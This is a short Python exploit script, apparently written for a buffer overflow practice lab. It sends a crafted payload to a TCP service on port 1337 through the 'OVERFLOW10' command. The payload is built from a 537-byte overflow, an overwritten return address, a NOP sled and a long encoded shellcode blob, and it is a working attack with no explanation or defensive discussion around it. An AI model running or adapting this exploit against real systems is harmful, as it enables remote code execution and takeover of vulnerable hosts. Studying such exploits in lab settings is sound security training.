#!/usr/bin/env python3

import socket, sys


'''
Getting offset 
'''


ip = "10.10.42.175"
port = 1337

prefix = b"OVERFLOW10 "
offset = 537
overflow = b"A" * offset
retn = b"\x03\x12\x50\x62"
padding = b"\x90"*16      # used for giving some space to unpack encoding(in this case, shikataganai)


shellcode = b"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\x6d\x51\x09\x59\x83\xee\xfc\xe2\xf4\x91\xb9\x8b\x59\x6d\x51\x69\xd0\x88\x60\xc9\x3d\xe6\x01\x39\xd2\x3f\x5d\x82\x0b\x79\xda\x7b\x71\x62\xe6\x43\x7f\x5c\xae\xa5\x65\x0c\x2d\x0b\x75\x4d\x90\xc6\x54\x6c\x96\xeb\xab\x3f\x06\x82\x0b\x7d\xda\x43\x65\xe6\x1d\x18\x21\x8e\x19\x08\x88\x3c\xda\x50\x79\x6c\x82\x82\x10\x75\xb2\x33\x10\xe6\x65\x82\x58\xbb\x60\xf6\xf5\xac\x9e\x04\x58\xaa\x69\xe9\x2c\x9b\x52\x74\xa1\x56\x2c\x2d\x2c\x89\x09\x82\x01\x49\x50\xda\x3f\xe6\x5d\x42\xd2\x35\x4d\x08\x8a\xe6\x55\x82\x58\xbd\xd8\x4d\x7d\x49\x0a\x52\x38\x34\x0b\x58\xa6\x8d\x0e\x56\x03\xe6\x43\xe2\xd4\x30\x39\x3a\x6b\x6d\x51\x61\x2e\x1e\x63\x56\x0d\x05\x1d\x7e\x7f\x6a\xae\xdc\xe1\xfd\x50\x09\x59\x44\x95\x5d\x09\x05\x78\x89\x32\x6d\xae\xdc\x09\x3d\x01\x59\x19\x3d\x11\x59\x31\x87\x5e\xd6\xb9\x92\x84\x9e\x33\x68\x39\x03\x51\x1d\xac\x61\x5b\x6d\x40\x55\xd0\x8b\x3b\x19\x0f\x3a\x39\x90\xfc\x19\x30\xf6\x8c\xe8\x91\x7d\x55\x92\x1f\x01\x2c\x81\x39\xf9\xec\xcf\x07\xf6\x8c\x05\x32\x64\x3d\x6d\xd8\xea\x0e\x3a\x06\x38\xaf\x07\x43\x50\x0f\x8f\xac\x6f\x9e\x29\x75\x35\x58\x6c\xdc\x4d\x7d\x7d\x97\x09\x1d\x39\x01\x5f\x0f\x3b\x17\x5f\x17\x3b\x07\x5a\x0f\x05\x28\xc5\x66\xeb\xae\xdc\xd0\x8d\x1f\x5f\x1f\x92\x61\x61\x51\xea\x4c\x69\xa6\xb8\xea\xe9\x44\x47\x5b\x61\xff\xf8\xec\x94\xa6\xb8\x6d\x0f\x25\x67\xd1\xf2\xb9\x18\x54\xb2\x1e\x7e\x23\x66\x33\x6d\x02\xf6\x8c"


#postfix = b""

payload = prefix + overflow + retn + padding + shellcode     #Add NOPs \x90

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

try:
    s.connect((ip,port))
    print("Sending payload...")
    #s.recv(1024)
    s.send(payload + b'\r\n')
    #s.recv(1024)
    print("Done!")
    s.close

except:
    print("Cannot connect to server")
    sys.exit()
